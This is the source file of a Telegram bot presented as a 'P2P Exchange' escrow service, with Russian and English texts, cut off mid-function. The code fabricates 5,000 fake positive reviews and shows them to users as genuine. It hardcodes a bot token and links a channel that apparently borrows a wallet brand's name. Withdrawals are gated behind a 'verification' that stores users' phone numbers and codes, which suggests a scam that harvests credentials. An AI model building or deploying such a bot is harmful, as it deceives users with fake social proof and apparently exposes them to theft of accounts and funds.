import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8887592726:AAH4OpqWZRsZytA7L1O0nrhiDpfMMiNiy6o"
MASTER_ADMIN_ID = 8986358602
BOT_USERNAME = "exchangetom_bot"
BOT_NAME = "P2P Exchange"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"
SUPPORT_LINK = "@p2pexchangeton"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 2. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "verification_requests": "verification_requests.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
verification_requests = load_json(FILES["verification_requests"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])

# ============================================================
# 3. ГЕНЕРАЦИЯ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)

generate_reviews()

# ============================================================
# 4. ЯЗЫКИ
# ============================================================
LANGUAGES = {
    "ru": "🇷🇺 Русский",
    "en": "🇬🇧 English"
}

LOCALE = {
    "ru": {
        "bot_name": "P2P Exchange",
        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
        "feature1": "Честные сделки между продавцами и покупателями",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Гарант безопасности с обеих сторон",
        "feature4": "Премиум поддержка 24/7",
        "how_it_works": "КАК ЭТО РАБОТАЕТ",
        "step1": "Продавец создаёт сделку в Mini App",
        "step2": "Продавец отправляет ссылку покупателю",
        "step3": "Покупатель оплачивает в Mini App",
        "step4": "Продавец подтверждает передачу в Mini App",
        "step5": "Покупатель подтверждает получение в Mini App",
        "step6": "Деньги зачисляются на баланс продавца",
        "our_channel": "НАШ КАНАЛ",
        "support": "ПОДДЕРЖКА",
        "support_contact": "@p2pexchangeton",
        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
        "create_deal": "СОЗДАТЬ СДЕЛКУ",
        "my_balance": "МОЙ БАЛАНС",
        "my_deals": "МОИ СДЕЛКИ",
        "how_to_deal": "КАК СОЗДАТЬ СДЕЛКУ",
        "faq": "ОТЗЫВЫ",
        "channel": "КАНАЛ",
        "admin_panel": "АДМИН",
        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
        "your_balance": "ВАШ БАЛАНС",
        "main_menu": "ГЛАВНОЕ МЕНЮ",
        "no_deals": "У ВАС НЕТ СДЕЛОК",
        "your_deals": "ВАШИ СДЕЛКИ",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "copy_link": "СКОПИРОВАТЬ ССЫЛКУ",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "send_link_to_buyer": "ОТПРАВЬТЕ ССЫЛКУ ПОКУПАТЕЛЮ",
        "deal_created": "СДЕЛКА СОЗДАНА",
        "how_to_deal_text": "📖 <b>КАК СОЗДАТЬ СДЕЛКУ</b>\n\n1️⃣ Нажмите «СОЗДАТЬ СДЕЛКУ»\n   → Откроется Mini App\n\n2️⃣ Заполните форму в Mini App:\n   • Название товара\n   • Валюту (TON/STARS/RUB/UAH)\n   • Сумму\n   • Username покупателя\n\n3️⃣ В Mini App выберите способ оплаты:\n   • С баланса — мгновенно\n   • По реквизитам — после проверки админом\n\n4️⃣ Отправьте ссылку покупателю\n\n5️⃣ После оплаты в Mini App:\n   • Продавец нажимает «Передал товар»\n   • Покупатель нажимает «Получил товар»\n   • Деньги зачисляются на баланс\n\n🔥 ВСЕ ОПЕРАЦИИ ТОЛЬКО В MINI APP!"
    },
    "en": {
        "bot_name": "P2P Exchange",
        "bot_desc": "SECURE DEALS",
        "feature1": "Fair deals between sellers and buyers",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Security guarantee from both sides",
        "feature4": "Premium 24/7 support",
        "how_it_works": "HOW IT WORKS",
        "step1": "Seller creates deal in Mini App",
        "step2": "Seller sends link to buyer",
        "step3": "Buyer pays in Mini App",
        "step4": "Seller confirms delivery in Mini App",
        "step5": "Buyer confirms receipt in Mini App",
        "step6": "Money credited to seller's balance",
        "our_channel": "OUR CHANNEL",
        "support": "SUPPORT",
        "support_contact": "@p2pexchangeton",
        "start_now": "START NOW",
        "create_deal": "CREATE DEAL",
        "my_balance": "MY BALANCE",
        "my_deals": "MY DEALS",
        "how_to_deal": "HOW TO CREATE DEAL",
        "faq": "REVIEWS",
        "channel": "CHANNEL",
        "admin_panel": "ADMIN",
        "choose_action": "CHOOSE ACTION",
        "your_balance": "YOUR BALANCE",
        "main_menu": "MAIN MENU",
        "no_deals": "YOU HAVE NO DEALS",
        "your_deals": "YOUR DEALS",
        "deal_not_found": "DEAL NOT FOUND",
        "access_denied": "ACCESS DENIED",
        "payment_confirmed": "PAYMENT CONFIRMED",
        "seller_confirmed": "YOU CONFIRMED DELIVERY",
        "buyer_confirmed": "YOU CONFIRMED RECEIPT",
        "deal_completed": "DEAL COMPLETED",
        "insufficient_balance": "INSUFFICIENT BALANCE",
        "status_waiting": "WAITING FOR PAYMENT",
        "status_paid": "PAID",
        "status_awaiting": "AWAITING CONFIRMATION",
        "status_completed": "COMPLETED",
        "select_language": "SELECT LANGUAGE",
        "welcome": "WELCOME",
        "choose_language_prompt": "🌐 SELECT YOUR LANGUAGE:",
        "product": "PRODUCT",
        "amount": "AMOUNT",
        "seller": "SELLER",
        "buyer": "BUYER",
        "deal": "DEAL",
        "waiting_for_delivery": "WAITING FOR DELIVERY",
        "seller_delivered": "SELLER DELIVERED",
        "confirm_receipt": "CONFIRM RECEIPT",
        "contact_support": "CONTACT SUPPORT",
        "balance_added": "BALANCE ADDED",
        "admin_rights": "INSUFFICIENT RIGHTS",
        "admin_added": "ADMIN ADDED",
        "admin_removed": "ADMIN REMOVED",
        "admin_list": "ADMIN LIST",
        "no_deals_total": "NO DEALS",
        "all_deals_title": "ALL DEALS",
        "no_active_requests": "NO ACTIVE REQUESTS",
        "copy_link": "COPY LINK",
        "deal_link_text": "LINK FOR BUYER",
        "send_link_to_buyer": "SEND LINK TO BUYER",
        "deal_created": "DEAL CREATED",
        "how_to_deal_text": "📖 <b>HOW TO CREATE A DEAL</b>\n\n1️⃣ Click 'CREATE DEAL'\n   → Opens Mini App\n\n2️⃣ Fill in the form in Mini App:\n   • Product name\n   • Currency (TON/STARS/RUB/UAH)\n   • Amount\n   • Buyer's username\n\n3️⃣ Choose payment method in Mini App:\n   • From balance — instantly\n   • By details — after admin check\n\n4️⃣ Send the link to the buyer\n\n5️⃣ After payment in Mini App:\n   • Seller clicks 'Delivered'\n   • Buyer clicks 'Received'\n   • Money goes to balance\n\n🔥 ALL OPERATIONS ONLY IN MINI APP!"
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 5. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int) -> str:
    return user_language.get(str(user_id), "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        if (datetime.now() - verified_time).total_seconds() > 86400:
            return False
        return True
    return False

def complete_verification(user_id: int, phone: str, code: str):
    uid = str(user_id)
    verification_data[uid] = {
        "verified_at": datetime.now().isoformat(),
        "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
        "phone": phone,
        "code": code
    }
    save_json(FILES["verification"], verification_data)

async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass

# ============================================================
# 6. FSM (ТОЛЬКО ДЛЯ АДМИНА)
# ============================================================
class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

# ============================================================
# 7. КЛАВИАТУРЫ (КОМПАКТНЫЕ)
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text="📱 Создать", web_app=WebAppInfo(url=MINI_APP_URL)),
            InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text="📊 Сделки", callback_data="menu_deals"),
            InlineKeyboardButton(text="📖 Как создать", callback_data="how_to_deal"),
        ],
        [
            InlineKeyboardButton(text="⭐️ Отзывы", callback_data="menu_reviews"),
            InlineKeyboardButton(text="📢 Канал", callback_data="menu_channel"),
        ],
        [
            InlineKeyboardButton(text="🌐 Язык", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text="👑 Админ", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Начислить", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="👥 Админы", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text="📊 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="💲 Выводы", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text="⭐️ Отзывы", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def mini_app_keyboard(text: str, page: str = ""):
    """Кнопка с Mini App вместо текстовой ссылки"""
    url = MINI_APP_URL
    if page:
        url += f"?page={page}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=text, web_app=WebAppInfo(url=url))],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])

# ============================================================
# 8. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    lang = get_user_language(message.from_user.id)
    
    if not lang:
        await message.answer(
            f"🌐 {get_text('ru', 'choose_language_prompt')}",
            reply_markup=language_keyboard()
        )
        return
    
    welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥

{get_text(lang, 'bot_desc')}
• {get_text(lang, 'feature1')}
• {get_text(lang, 'feature2')}
• {get_text(lang, 'feature3')}
• {get_text(lang, 'feature4')}

📊 {get_text(lang, 'how_it_works')}:
1️⃣ {get_text(lang, 'step1')}
2️⃣ {get_text(lang, 'step2')}
3️⃣ {get_text(lang, 'step3')}
4️⃣ {get_text(lang, 'step4')}
5️⃣ {get_text(lang, 'step5')}
6️⃣ {get_text(lang, 'step6')}

📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}

🔥 {get_text(lang, 'start_now')} 🚀"""
    
    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer(f"✅ {get_text(lang, 'welcome')}")
    
    welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥

{get_text(lang, 'bot_desc')}
• {get_text(lang, 'feature1')}
• {get_text(lang, 'feature2')}
• {get_text(lang, 'feature3')}
• {get_text(lang, 'feature4')}

📊 {get_text(lang, 'how_it_works')}:
1️⃣ {get_text(lang, 'step1')}
2️⃣ {get_text(lang, 'step2')}
3️⃣ {get_text(lang, 'step3')}
4️⃣ {get_text(lang, 'step4')}
5️⃣ {get_text(lang, 'step5')}
6️⃣ {get_text(lang, 'step6')}

📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}

🔥 {get_text(lang, 'start_now')} 🚀"""
    
    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id))

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🌐 {get_text('ru', 'choose_language_prompt')}",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.message.edit_text(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = f"""📢 {get_text(lang, 'our_channel')}

🔥 {CHANNEL_LINK}

🚀 Подписывайся!"""
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = get_text(lang, 'how_to_deal_text')
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 9. БАЛАНС
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    bal = get_balance(callback.from_user.id)
    verif_status = "🔓 Доступен" if is_verified(callback.from_user.id) else "🔒 Требуется верификация"
    
    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>

💎 TON: {bal.get('ton', 0)}
⭐️ STARS: {bal.get('stars', 0)}
💰 RUB: {bal.get('rub', 0)}
🌐 UAH: {bal.get('uah', 0)}

📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}

🔐 Верификация: {verif_status}

📱 ВСЕ ОПЕРАЦИИ В MINI APP"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💲 Вывод", callback_data="start_withdraw")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    
    if not user_deals:
        await callback.message.edit_text(
            f"📭 {get_text(lang, 'no_deals')}",
            reply_markup=back_to_main_keyboard(callback.from_user.id)
        )
        return
    
    text = f"📊 <b>{get_text(lang, 'your_deals')}</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
            "paid": f"✅ {get_text(lang, 'status_paid')}",
            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
            "completed": f"🎉 {get_text(lang, 'status_completed')}"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"
    
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 10. ОТЗЫВЫ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    reviews_list = list(reviews.values())
    
    if not reviews_list:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов"
    else:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b> (всего: {len(reviews_list)})\n\n"
        for r in reviews_list[-10:]:
            user = r.get('user', 'Аноним')
            rating = '⭐' * r.get('rating', 5)
            text += f"👤 <b>{user}</b> | {rating}\n"
            text += f"📝 {r.get('text', '')[:150]}\n"
            text += f"🕐 {r.get('date', 'недавно')}\n\n"
    
    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
# ============================================================
async def handle_deal_link(message: types.Message, deal_id: str):
    lang = get_user_language(message.from_user.id)
    if deal_id not in deals:
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return

    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ {get_text(lang, 'access_denied')}!\n\n"
            f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    text = f"""✈️ <b>{get_text(lang, 'deal')} #{deal_id}</b>

📦 {get_text(lang, 'product')}: {deal['product']}
💰 {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}
👤 {get_text(lang, 'seller')}: @{deal['seller_username']}

⬇️ ПЕРЕЙДИТЕ В MINI APP ДЛЯ ОПЛАТЫ"""

    await message.answer(
        text,
        reply_markup=mini_app_keyboard("💳 Перейти в Mini App", "pay")
    )

# ============================================================
# 12. ВЫВОД
# ============================================================
@dp.callback_query(lambda c: c.data == "start_withdraw")
async def start_withdraw(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    
    if not is_verified(callback.from_user.id):
        text = f"""⚠️ <b>{get_text(lang, 'verification_required')}</b>

🔐 Пройдите верификацию в Mini App"""
        
        await callback.message.edit_text(
            text,
            reply_markup=mini_app_keyboard("🔐 Верификация", "verify")
        )
        return
    
    bal = get_balance(callback.from_user.id)
    verif_data = verification_data[str(callback.from_user.id)]
    
    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>

💎 TON: {bal.get('ton', 0)}
⭐️ STARS: {bal.get('stars', 0)}
💰 RUB: {bal.get('rub', 0)}
🌐 UAH: {bal.get('uah', 0)}

🔑 Ваш код: {verif_data.get('code', 'неизвестно')}
🕐 Сессия активна до: {verif_data.get('expires_at', 'неизвестно')[:19]}

📱 Вывод средств в Mini App"""
    
    await callback.message.edit_text(
        text,
        reply_markup=mini_app_keyboard("💲 Вывести", "withdraw")
    )
    await callback.answer()

# ============================================================
# 13. АДМИН ПАНЕЛЬ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await callback.message.edit_text(
        f"👑 <b>{get_text(lang, 'admin_panel')}</b>\n\n{get_text(lang, 'choose_action')}:",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await callback.message.edit_text(f"💰 <b>{get_text(lang, 'balance_added')}</b>\n\nВведите ID пользователя:")
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await message.answer(f"💱 Выберите валюту:", reply_markup=currency_keyboard())
        await state.set_state(AdminStates.waiting_currency)
    except:
        await message.answer(f"❌ Неверный ID")

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    currency = callback.data.split("_")[1]
    await state.update_data(target_currency=currency)
    await callback.message.edit_text(f"💰 Введите сумму в {currency}:")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        user_id = data.get("target_user_id")
        currency = data.get("target_currency")
        add_balance(user_id, currency, amount)
        await message.answer(
            f"✅ Начислено {amount} {currency} пользователю {user_id}",
            reply_markup=admin_panel_keyboard(message.from_user.id)
        )
        await state.clear()
    except:
        await message.answer(f"❌ Неверная сумма")

@dp.callback_query(lambda c: c.data == "admin_manage_admins")
async def admin_manage_admins(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
    await callback.message.edit_text(
        f"👥 <b>{get_text(lang, 'admin_list')}</b>\n\n"
        f"Главный админ: {MASTER_ADMIN_ID}\n"
        f"Дополнительные:\n{admin_list}\n\n"
        f"/add_admin [ID] - добавить\n"
        f"/remove_admin [ID] - удалить",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.message(Command("add_admin"))
async def add_admin(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ Использование: /add_admin [ID]")
        return
    try:
        new_admin_id = int(args[1])
        admins[str(new_admin_id)] = True
        save_json(FILES["admins"], admins)
        await message.answer(f"✅ Админ добавлен: {new_admin_id}")
    except:
        await message.answer(f"❌ Неверный ID")

@dp.message(Command("remove_admin"))
async def remove_admin(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ Использование: /remove_admin [ID]")
        return
    try:
        admin_id = int(args[1])
        if admin_id == MASTER_ADMIN_ID:
            await message.answer(f"❌ Нельзя удалить главного админа")
            return
        if str(admin_id) in admins:
            del admins[str(admin_id)]
            save_json(FILES["admins"], admins)
            await message.answer(f"✅ Админ удалён: {admin_id}")
        else:
            await message.answer(f"❌ Админ не найден")
    except:
        await message.answer(f"❌ Неверный ID")

@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    if not deals:
        await callback.message.edit_text(f"📭 {get_text(lang, 'no_deals_total')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"📊 <b>{get_text(lang, 'all_deals_title')}</b>\n\n"
    for d_id, d in list(deals.items())[-20:]:
        status_map = {
            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
            "paid": f"✅ {get_text(lang, 'status_paid')}",
            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
            "completed": f"🎉 {get_text(lang, 'status_completed')}"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text(f"📭 {get_text(lang, 'no_active_requests')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"💲 <b>Заявки на вывод</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
